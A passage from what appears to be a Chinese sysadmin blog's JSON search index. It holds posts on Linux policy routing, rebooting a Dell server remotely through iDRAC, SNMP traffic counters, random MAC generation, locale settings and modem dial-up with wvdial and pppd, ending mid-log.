\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意：vpn.rendoumi.com替换成你自己对应的ip或者域名\u003c/p\u003e\n\u003cp\u003e然后你把这个配置文件下载，安装到MacOS或者iOS中，就可以愉快的玩耍了。\u003c/p\u003e","title":"Docker急速搭建运行ikev2 vpn来让iphone翻墙"},{"content":"如果我们有两条上网线路可以使用，那么策略路由就是个好的选择了。\n基本概念：\n策略路由表（Policy routing tables）: Linux 缺省有3个表， local (不能改也不能删), main, 和 default。添加路由的时候如果不指定，缺省是添加到main路由表里的。 策略路由规则（Policy routing rules）: Linux 缺省也有三套路由规则，对应三个缺省路由表。 查看一下就可以看到三个表：\n# ip rule list 0: from all lookup local 32766: from all lookup main 32767: from all lookup default 查local表的路由规则：\n# ip route list table local local 10.10.0.1 dev tun0 proto kernel scope host src 10.10.0.1 broadcast 127.255.255.255 dev lo proto kernel scope link src 127.0.0.1 local 192.168.122.1 dev virbr0 proto kernel scope host src 192.168.122.1 local 172.16.8.1 dev br0 proto kernel scope host src 172.16.8.1 broadcast 192.168.122.0 dev virbr0 proto kernel scope link src 192.168.122.1 broadcast 172.16.8.0 dev br0 proto kernel scope link src 172.16.8.1 broadcast 172.16.9.255 dev br0 proto kernel scope link src 172.16.8.1 broadcast 127.0.0.0 dev lo proto kernel scope link src 127.0.0.1 broadcast 192.168.122.255 dev virbr0 proto kernel scope link src 192.168.122.1 local 127.0.0.1 dev lo proto kernel scope host src 127.0.0.1 local 127.0.0.0/8 dev lo proto kernel scope host src 127.0.0.1 使用策略路由的方法也很简单，1、定义一个路由表，2、定义路由规则，3、应用路由规则。\n一、先建立一个自定义的路由表，ID 是 10000 ，名字叫做mygod（注意，ID从0-32766之间随你便起，3万多个可选）：\necho 10000 mygod \u0026gt;\u0026gt; /etc/iproute2/rt_tables 二、建立路由规则\nip rule add from \u0026lt;source address\u0026gt; lookup \u0026lt;table name\u0026gt; 假设我们机器上连了两条线路，两块网卡，分配了2个ip，第一个线路是eth0，ip是192.168.1.1，第二个线路是eth1，ip是192.168.2.1。我们添加一下策略路由规则，从192.168.2.1过来的走mygod规则。\nip rule add from 192.168.2.1 lookup mygod 三、应用路由规则\nip route add default via 192.168.2.1 dev eth1 table mygod 注意，这里是应用了缺省路由，当然你也可以弄其他的。比如，一台机器一个网卡，N个IP，每个ip对应不同的专线。你就可以添加不同的非缺省路由。另外，也是支持vlan的。\nip route add default via 192.168.2.1 dev eth0.30 table vlan30 如果想把策略路由固定下来，不用每次都执行shell脚本，生成下面两个文件：\n# vi /etc/sysconfig/network-scripts/route-eth1 192.168.2.0/24 dev eth1 table mygod default via 192.168.2.1 dev eth1 table mygod # vi /etc/sysconfig/network-scripts/rule-eth1 from 192.168.2.0/24 lookup mygod ","permalink":"https://rendoumi.com/posts/20240110-route_policy/","summary":"\u003cp\u003e如果我们有两条上网线路可以使用，那么策略路由就是个好的选择了。\u003c/p\u003e\n\u003cp\u003e基本概念：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e策略路由表（Policy routing tables）: Linux 缺省有3个表，  local (不能改也不能删), main, 和 default。添加路由的时候如果不指定，缺省是添加到\u003ccode\u003emain\u003c/code\u003e路由表里的。\u003c/li\u003e\n\u003cli\u003e策略路由规则（Policy routing rules）: Linux 缺省也有三套路由规则，对应三个缺省路由表。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e查看一下就可以看到三个表：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ip rule list\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e0:    from all lookup \u003cspan class=\"nb\"\u003elocal\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e32766:    from all lookup main  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e32767:    from all lookup default  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e查local表的路由规则：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ip route list table local\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003elocal\u003c/span\u003e 10.10.0.1 dev tun0  proto kernel  scope host  src 10.10.0.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebroadcast 127.255.255.255 dev lo  proto kernel  scope link  src 127.0.0.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003elocal\u003c/span\u003e 192.168.122.1 dev virbr0  proto kernel  scope host  src 192.168.122.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003elocal\u003c/span\u003e 172.16.8.1 dev br0  proto kernel  scope host  src 172.16.8.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebroadcast 192.168.122.0 dev virbr0  proto kernel  scope link  src 192.168.122.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebroadcast 172.16.8.0 dev br0  proto kernel  scope link  src 172.16.8.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebroadcast 172.16.9.255 dev br0  proto kernel  scope link  src 172.16.8.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebroadcast 127.0.0.0 dev lo  proto kernel  scope link  src 127.0.0.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebroadcast 192.168.122.255 dev virbr0  proto kernel  scope link  src 192.168.122.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003elocal\u003c/span\u003e 127.0.0.1 dev lo  proto kernel  scope host  src 127.0.0.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003elocal\u003c/span\u003e 127.0.0.0/8 dev lo  proto kernel  scope host  src 127.0.0.1  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e使用策略路由的方法也很简单，1、定义一个路由表，2、定义路由规则，3、应用路由规则。\u003c/p\u003e","title":"Linux下的策略路由"},{"content":"记录一下，2016年的5月5日这天的中午。\n正在跟老刘、大亮、Good宁一起吃午饭，突然手机接到短信报警，说是主数据库Down了。出大事了！！！\n这个是很常见的场景吧，如何在这种情况下处理服务器故障呢？基本吃饭的时候是不会携带笔记本的，所有的操作只能在手机上完成了。\n如果是iphone手机，装上Termius；如果是android手机，装上Juicessh。这两个都是远程ssh软件（我们的服务器都是Linux，没有Windows）。另外公司是有openvpn的，必须通过vpn才能连接到IDC的服务器，所以也需要手机装上openvpn软件。\n拨通vpn，用ssh连上服务器，然后快速运行实现编写好的ping脚本：\ncat 1.ping.sh #!/bin/sh ping 172.8.$1 这个脚本很奇怪吧，名字叫做1.ping.sh，是因为在手机上操作，一切都要迅速，Termius和Juicessh都是支持命令补全的{tab}键的，所以只要输入./1{tab} 1.1 就等于执行了ping 172.8.1.1，上面只输入了6个字符，而完整的ping命令则需要输入14个字符，这就是原因了。\nping一下不通，那就赶紧执行脚本，抓一下服务器idrac前面板的信息：\ncat 2.idrac.sh #!/bin/sh sshpass -p \u0026#34;xxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm get System.LCD.CurrentDisplay 上面脚本用dell的radadm来抓取服务器idrac的前面板信息，idrac和网卡的网段只是前面第一段不同，网卡是172，idrac是10，这样很方便记忆。\n得到结果：\nCPU1 has internal error. (IERR) 彻底完蛋！CPU出错了，想都不用想，硬件重启：\ncat 3.reboot.sh #!/bin/sh\rsshpass -p \u0026#34;xxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm serveraction powercycle 从powercycle到Centos完全启动，系统开始记录/var/log/messages，所有时间共花费了7分钟。\n注意：有可能在重启的过程中需要按一下F1的按钮继续，这样就需要打开vnc，按那一下子，或者提前在idrac里设置ErrPrompt disabled，不需要按F1就重启。\nsshpass -p \u0026#34;xxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm set BIOS.MiscSettings.ErrPrompt Disabled 总结：这起故障从接到报警到检查完毕只花费了3分钟，然后重启，7分钟机器系统启动，2分钟oracle备库恢复，3+7+2=12分钟。这真是个极限时间了。\n运维能做到的也就这么快了吧。\n","permalink":"https://rendoumi.com/posts/20240110-dell_restart/","summary":"\u003cp\u003e记录一下，2016年的5月5日这天的中午。\u003c/p\u003e\n\u003cp\u003e正在跟老刘、大亮、Good宁一起吃午饭，突然手机接到短信报警，说是主数据库Down了。出大事了！！！\u003c/p\u003e\n\u003cp\u003e这个是很常见的场景吧，如何在这种情况下处理服务器故障呢？基本吃饭的时候是不会携带笔记本的，所有的操作只能在手机上完成了。\u003c/p\u003e\n\u003cp\u003e如果是iphone手机，装上\u003ccode\u003eTermius\u003c/code\u003e；如果是android手机，装上\u003ccode\u003eJuicessh\u003c/code\u003e。这两个都是远程ssh软件（我们的服务器都是Linux，没有Windows）。另外公司是有openvpn的，必须通过vpn才能连接到IDC的服务器，所以也需要手机装上openvpn软件。\u003c/p\u003e\n\u003cp\u003e拨通vpn，用ssh连上服务器，然后快速运行实现编写好的ping脚本：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat 1.ping.sh  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#!/bin/sh\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eping 172.8.\u003cspan class=\"nv\"\u003e$1\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这个脚本很奇怪吧，名字叫做1.ping.sh，是因为在手机上操作，一切都要迅速，Termius和Juicessh都是支持命令补全的{tab}键的，所以只要输入./1{tab} 1.1 就等于执行了ping 172.8.1.1，上面只输入了6个字符，而完整的ping命令则需要输入14个字符，这就是原因了。\u003c/p\u003e\n\u003cp\u003eping一下不通，那就赶紧执行脚本，抓一下服务器idrac前面板的信息：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat 2.idrac.sh  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#!/bin/sh\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esshpass -p \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxx\u0026#34;\u003c/span\u003e ssh -oStrictHostKeyChecking\u003cspan class=\"o\"\u003e=\u003c/span\u003eno root@10.8.\u003cspan class=\"nv\"\u003e$1\u003c/span\u003e racadm get System.LCD.CurrentDisplay  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e上面脚本用dell的radadm来抓取服务器idrac的前面板信息，idrac和网卡的网段只是前面第一段不同，网卡是172，idrac是10，这样很方便记忆。\u003c/p\u003e\n\u003cp\u003e得到结果：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCPU1 has internal error. \u003cspan class=\"o\"\u003e(\u003c/span\u003eIERR\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e彻底完蛋！CPU出错了，想都不用想，硬件重启：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ecat 3.reboot.sh  \r\n#!/bin/sh\r\nsshpass -p \u0026#34;xxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm serveraction powercycle  \n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e从powercycle到Centos完全启动，系统开始记录/var/log/messages，所有时间共花费了7分钟。\u003c/p\u003e\n\u003cp\u003e注意：有可能在重启的过程中需要按一下F1的按钮继续，这样就需要打开vnc，按那一下子，或者提前在idrac里设置ErrPrompt disabled，不需要按F1就重启。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esshpass -p \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxx\u0026#34;\u003c/span\u003e ssh -oStrictHostKeyChecking\u003cspan class=\"o\"\u003e=\u003c/span\u003eno root@10.8.\u003cspan class=\"nv\"\u003e$1\u003c/span\u003e racadm \u003cspan class=\"nb\"\u003eset\u003c/span\u003e BIOS.MiscSettings.ErrPrompt Disabled  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e总结：这起故障从接到报警到检查完毕只花费了3分钟，然后重启，7分钟机器系统启动，2分钟oracle备库恢复，3+7+2=12分钟。这真是个极限时间了。\u003c/p\u003e\n\u003cp\u003e运维能做到的也就这么快了吧。\u003c/p\u003e","title":"服务器R920的一次急速故障处理"},{"content":"用bash随机生成网卡地址：\necho 52:54:$(dd if=/dev/urandom count=1 2\u0026gt;/dev/null | md5sum | sed \u0026#39;s/^\\(..\\)\\(..\\)\\(..\\)\\(..\\).*$/\\1:\\2:\\3:\\4/\u0026#39;) 52:54:f6:65:52:39 另一种做法：\nopenssl rand -hex 6 | sed \u0026#39;s/\\(..\\)/\\1:/g; s/.$//\u0026#39; ","permalink":"https://rendoumi.com/posts/20240109-kvm_random_mac/","summary":"\u003cp\u003e用bash随机生成网卡地址：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e 52:54:\u003cspan class=\"k\"\u003e$(\u003c/span\u003edd \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/dev/urandom \u003cspan class=\"nv\"\u003ecount\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e 2\u0026gt;/dev/null \u003cspan class=\"p\"\u003e|\u003c/span\u003e md5sum \u003cspan class=\"p\"\u003e|\u003c/span\u003e sed \u003cspan class=\"s1\"\u003e\u0026#39;s/^\\(..\\)\\(..\\)\\(..\\)\\(..\\).*$/\\1:\\2:\\3:\\4/\u0026#39;\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e52:54:f6:65:52:39  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e另一种做法：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eopenssl rand -hex \u003cspan class=\"m\"\u003e6\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e sed \u003cspan class=\"s1\"\u003e\u0026#39;s/\\(..\\)/\\1:/g; s/.$//\u0026#39;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"KVM中网卡地址随机生成方法"},{"content":"vim 编辑文件，里面是有中文的，可是环境变量中LANG=C，非常不便啊，经常得export LANG=zh_CN来解决。放在/etc/profile里也不是个事。\n一劳永逸的方法：\n# vi /etc/sysconfig/i18n ------ LANG=\u0026#34;zh_CN.UTF-8\u0026#34; SUPPORTED=\u0026#34;zh_CN.UTF-8:zh_CN:zh:zh_TW.UTF-8:zh_TW:zh:en_US.UTF-8:en_US:en\u0026#34; SYSFONT=\u0026#34;latarcyrheb-sun16\u0026#34; ------ ","permalink":"https://rendoumi.com/posts/20240109-linux_lang/","summary":"\u003cp\u003evim 编辑文件，里面是有中文的，可是环境变量中LANG=C，非常不便啊，经常得export LANG=zh_CN来解决。放在/etc/profile里也不是个事。\u003c/p\u003e\n\u003cp\u003e一劳永逸的方法：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# vi /etc/sysconfig/i18n\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e------\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eLANG\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;zh_CN.UTF-8\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eSUPPORTED\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;zh_CN.UTF-8:zh_CN:zh:zh_TW.UTF-8:zh_TW:zh:en_US.UTF-8:en_US:en\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eSYSFONT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;latarcyrheb-sun16\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e------\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Linux下设置LANG变量"},{"content":"想自己画图来监控交换机的流量，第一步就是通过snmpwalk来得到交换机的进出流量：\n我们用得是Cisco 3750的24口交换机，给个OID表：\n先看一下交换机的端口情况：\nsnmpwalk -v 2c -c xxxxxxxx 172.16.1.1 .1.3.6.1.2.1.2.2.1.2 得到一堆信息，问网络工程师得到1/0/5和2/0/5这两个端口是双上连线路：\nIF-MIB::ifDescr.10105 = STRING: GigabitEthernet1/0/5 IF-MIB::ifDescr.10605 = STRING: GigabitEthernet2/0/5 记住两个端口的描述符，10105和10605.\n继续，我们看上表，.1.3.6.1.2.1.2.2.1.10(接口收到的字节数)，我们要得到某个具体端口收到的字节数，就必须加上端口的描述符了。所以要得到1/0/5的收到字节数，就是.1.3.6.1.2.1.2.2.1.10.10105\n#snmpwalk -v 2c -c xxxxxxxx 172.16.1.1 .1.3.6.1.2.1.2.2.1.10.10105 IF-MIB::ifInOctets.10105 = Counter32: 2198534228 ok，拿到字节数了，然后单位是bytes，换算成bit(*8)，然后除若干1024，得到单位m，g, t等，入库，然后调hichart画图即可。\n然而，还有一个问题，看清上面的单位，Counter32，呵呵，所以这里是不对的。现如今的网络多是千兆网卡了，所以counter32是不对的, 100Mbps以上必须使用Counter64的单位，给个对照表：\n高速网卡(100兆以上）:\nifHCInOctets: 1.3.6.1.2.1.31.1.1.1.6 (64-bit Octets in counter) ifHCOutOctets: 1.3.6.1.2.1.31.1.1.1.10 (64-bit Octets out counter) ifHCInUcastPkts: 1.3.6.1.2.1.31.1.1.1.7 (64-bit Packets in counter) ifHCOutUcastPkts: 1.3.6.1.2.1.31.1.1.1.11 (64-bit Packets out counter) ifHighSpeed: 1.3.6.1.2.1.31.1.1.1.15 (An estimate of the interface\u0026rsquo;s current bandwidth in units of 1Mbps) 低速网卡：\nifInOctets: 1.3.6.1.2.1.2.2.1.10 (32-bit Octets in counter) ifOutOctets: 1.3.6.1.2.1.2.2.1.16 (32-bit Octets out counter) ifInUcastPkts: 1.3.6.1.2.1.2.2.1.11 (32-bit Packets in counter) ifOutUcastPkts: 1.3.6.1.2.1.2.2.1.17 (32-bit Packets out counter) ifSpeed: 1.3.6.1.2.1.2.2.1.5 (Currently negotiated speed of the interface - Max: 4.294 Gbps) 详细解释下：ifInOctets是32-bit无符整数，2的32次方是4,294,967,296。去掉0，所以范围是0-4,294,967,295，大概是34g的bit. 如果按网速74-92Mbps来算, 大概6分钟就会填满，92Mbps * 60seconds *6minutes = 33gigabits.所以填满是很快的，如果你正好在这期间读取数据，很有可能会读错。\n所以命令应该是：\nsnmpwalk -v 2c -c xxxxxxxx 172.16.1.1 1.3.6.1.2.1.31.1.1.1.6.10105 最后附上计算流量的公式：\n(ifInOctetsCurrent - ifInOctetsPrevious) * 8 / pollingSeconds ","permalink":"https://rendoumi.com/posts/20240108-snmp_network/","summary":"\u003cp\u003e想自己画图来监控交换机的流量，第一步就是通过snmpwalk来得到交换机的进出流量：\u003c/p\u003e\n\u003cp\u003e我们用得是Cisco 3750的24口交换机，给个OID表：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240108142515825\" loading=\"lazy\" src=\"/posts/20240108-snmp_network/image-20240108142515825.png\"\u003e\u003c/p\u003e\n\u003cp\u003e先看一下交换机的端口情况：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esnmpwalk -v 2c -c xxxxxxxx 172.16.1.1 .1.3.6.1.2.1.2.2.1.2  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e得到一堆信息，问网络工程师得到1/0/5和2/0/5这两个端口是双上连线路：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eIF-MIB::ifDescr.10105 \u003cspan class=\"o\"\u003e=\u003c/span\u003e STRING: GigabitEthernet1/0/5  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eIF-MIB::ifDescr.10605 \u003cspan class=\"o\"\u003e=\u003c/span\u003e STRING: GigabitEthernet2/0/5  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e记住两个端口的描述符，10105和10605.\u003c/p\u003e\n\u003cp\u003e继续，我们看上表，.1.3.6.1.2.1.2.2.1.10(接口收到的字节数)，我们要得到某个具体端口收到的字节数，就必须加上端口的描述符了。所以要得到1/0/5的收到字节数，就是.1.3.6.1.2.1.2.2.1.10.10105\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#snmpwalk -v 2c -c xxxxxxxx 172.16.1.1 .1.3.6.1.2.1.2.2.1.10.10105\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eIF-MIB::ifInOctets.10105 \u003cspan class=\"o\"\u003e=\u003c/span\u003e Counter32: \u003cspan class=\"m\"\u003e2198534228\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eok，拿到字节数了，然后单位是bytes，换算成bit(*8)，然后除若干1024，得到单位m，g, t等，入库，然后调hichart画图即可。\u003c/p\u003e\n\u003cp\u003e然而，还有一个问题，看清上面的单位，Counter32，呵呵，所以这里是不对的。现如今的网络多是千兆网卡了，所以counter32是不对的, 100Mbps以上必须使用Counter64的单位，给个对照表：\u003c/p\u003e\n\u003cp\u003e高速网卡(100兆以上）:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eifHCInOctets: 1.3.6.1.2.1.31.1.1.1.6 (64-bit Octets in counter)\u003c/li\u003e\n\u003cli\u003eifHCOutOctets: 1.3.6.1.2.1.31.1.1.1.10 (64-bit Octets out counter)\u003c/li\u003e\n\u003cli\u003eifHCInUcastPkts:  1.3.6.1.2.1.31.1.1.1.7 (64-bit Packets in counter)\u003c/li\u003e\n\u003cli\u003eifHCOutUcastPkts:  1.3.6.1.2.1.31.1.1.1.11 (64-bit Packets out counter)\u003c/li\u003e\n\u003cli\u003eifHighSpeed: 1.3.6.1.2.1.31.1.1.1.15 (An estimate of the interface\u0026rsquo;s current bandwidth in units of 1Mbps)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e低速网卡：\u003c/p\u003e","title":"SNMP OID来监控网络设备流量"},{"content":"公司为了跟建设银行建立专线，首先用电话线拨号进行测试。 买回来一个外置的Modem，接在服务器的com1口上，先用电话测试一下，OK没问题，那就继续配modem拨号\nLinux下配置Modem拨号有两种方式，传统的pppd方式和简单的wvdial方式。\n一、wvdial配置 wvdial的配置方法超级简单， 执行命令：wvdialconf /etc/wvdial.conf 它会自动测出系统的Modem，稍微修改一下，加几个参数：\nvi /etc/wvdial.conf [Dialer Defaults] Modem = /dev/ttyS0 Baud = 115200 Init1 = ATZ Init2 = ATQ0 V1 E1 S0=0 \u0026amp;C1 \u0026amp;D2 +FCLASS=0 ISDN = 0 Auto Reconnect = on Modem Type = Analog Modem Phone =0,28929191 Username = ttt Password = qqq 这就弄好了，执行wvdail \u0026amp;就可以拨号了，结束也很简单，kill -9 杀掉wvdial和ppd进程即可。\n注意：wvdial 拨通后系统多了一块网卡ppp0，路由信息都未修改，为了能到达建行的服务器，需要编辑/etc/ppp/ip-up文件，加一句：\nroute add -host 12.0.98.150 gw 12.0.98.236 然后重拨ping一下，ping 12.0.98.150，能ping通就说明ok了。\n二、pppd配置 wvdial隐藏了很多信息，我们下面用pppd来看看真实的拨号过程吧：\n其实modem拨号认证的方式有两种，一种是显示明文的login:(username:)方式，另一种是显示乱码的pap(chap)方式。\n①首先：\nvi /etc/ppp/options lock crtscts defaultroute noauth ②清理一下老的连接：\nkillall pppd rm /var/lock/LCK..ttyS0 ③找出认证的方式：\n/usr/sbin/pppd /dev/ttyS0 115200 debug connect \u0026#34;/usr/sbin/chat -v \u0026#39;\u0026#39; \u0026#39;AT\u0026amp;F0\u0026#39; OK ATD0,28929191 CONNECT \u0026#39;dc\u0026#39; \u0026#34; less /var/log/messages\n如果看见什么login username之流的那就是明文认证，如果类似下面的，看见了，那就是pap(chap)方式。\npppd 2.4.2 started by root, uid 0 Removed stale lock on ttyS0 (pid 3561) send (AT^M) expect (OK) AT^M^M OK -- got it send (ATD0,28929191^M) expect (CONNECT) ^M ATD0,28929191^M^M CONNECT -- got it send (d) Serial connection established. using channel 2 Using interface ppp0 Connect: ppp0 \u0026lt;--\u0026gt; /dev/ttyS0 sent [LCP ConfReq id=0x1 \u0026lt;mru 552\u0026gt; \u0026lt;asyncmap 0x0\u0026gt; \u0026lt;magic 0x3947d7a8\u0026gt; \u0026lt;pcomp\u0026gt; \u0026lt;accomp\u0026gt;] rcvd [LCP ConfReq id=0x1 \u0026lt;mru 1500\u0026gt; \u0026lt;asyncmap 0x0\u0026gt; \u0026lt;auth chap MD5\u0026gt; \u0026lt;magic 0xebe7666\u0026gt;] sent [LCP ConfAck id=0x1 \u0026lt;mru 1500\u0026gt; \u0026lt;asyncmap 0x0\u0026gt; \u0026lt;auth chap 